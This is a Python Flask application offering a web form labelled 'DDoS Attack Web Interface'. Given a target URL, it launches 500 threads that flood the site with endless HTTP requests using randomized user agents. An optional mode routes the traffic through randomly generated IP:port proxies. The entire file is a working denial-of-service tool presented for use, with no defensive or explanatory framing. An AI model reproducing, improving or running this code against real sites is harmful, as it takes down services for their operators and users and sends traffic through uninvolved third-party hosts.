from flask import Flask, render_template_string, request, jsonify
import threading
import urllib.request
import random
from user_agent import generate_user_agent
from urllib.request import ProxyHandler, build_opener

app = Flask(__name__)

def AttackMahos(url):
    while True:
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-us,en;q=0.5',
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Keep-Alive': '115',
            'Connection': 'keep-alive',
            'User-Agent': generate_user_agent()
        }
        try:
            req = urllib.request.urlopen(
                urllib.request.Request(url, headers=headers)
            )
            if req.status == 200:
                print(f'GOOD Attack: {url}')
            else:
                print(f'BAD Attack: {url}')
        except:
            print(f'DOWN: {url}')

def ProxyAttack(url):
    while True:
        ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
        port = random.choice(pl)
        proxy = ip + ":" + str(port)
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-us,en;q=0.5',
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Keep-Alive': '115',
            'Connection': 'keep-alive',
            'User-Agent': generate_user_agent()
        }
        try:
            proxy_handler = ProxyHandler({'http': 'http://' + proxy})
            opener = build_opener(proxy_handler)
            req = opener.open(urllib.request.Request(url, headers=headers))
            if req.status == 200:
                print(f'GOOD Attack: {url} | {proxy}')
            else:
                print(f'BAD Attack: {url} | {proxy}')
        except:
            print(f'DOWN: {url} | {proxy}')

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDoS Attack Web Interface</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; color: #333; }
        .container { width: 50%; margin: auto; padding: 20px; background-color: #fff; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
        h1 { text-align: center; }
        form { display: flex; flex-direction: column; gap: 10px; }
        label { font-size: 14px; }
        input, select { padding: 8px; font-size: 16px; margin-top: 5px; }
        button { padding: 10px; background-color: #28a745; color: #fff; border: none; cursor: pointer; }
        button:hover { background-color: #218838; }
        #result { margin-top: 20px; font-size: 16px; font-weight: bold; color: #333; }
    </style>
</head>
<body>
    <div class="container">
        <h1>DDoS Attack Web Interface</h1>
        <form id="attackForm">
            <label for="url">Enter URL</label>
            <input type="text" id="url" name="url" required>
            
            <label for="attack_type">Choose Attack Type:</label>
            <select id="attack_type" name="attack_type" required>
                <option value="1">Attack without Proxy</option>
                <option value="2">Attack with Proxy</option>
            </select>
            
            <button type="submit">ابدا الهجوم</button>
        </form>

        <div id="result"></div>
    </div>

    <script>
        document.getElementById('attackForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const url = document.getElementById('url').value;
            const attackType = document.getElementById('attack_type').value;

            fetch('/start_attack', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: `url=${url}&attack_type=${attackType}`
            })
            .then(response => response.json())
            .then(data => {
                const resultDiv = document.getElementById('result');
                resultDiv.textContent = `Attack started on ${data.url} with attack type ${data.attack_type}`;
            })
            .catch(error => {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
""")

@app.route('/start_attack', methods=['POST'])
def start_attack():
    url = request.form['url']
    attack_type = request.form['attack_type']

    if attack_type == '1':
        for _ in range(500):
            threading.Thread(target=AttackMahos, args=(url,)).start()
    elif attack_type == '2':
        for _ in range(500):
            threading.Thread(target=ProxyAttack, args=(url,)).start()

    return jsonify({"status": "Attack Started", "url": url, "attack_type": attack_type})

if __name__ == '__main__':
    app.run(debug=True)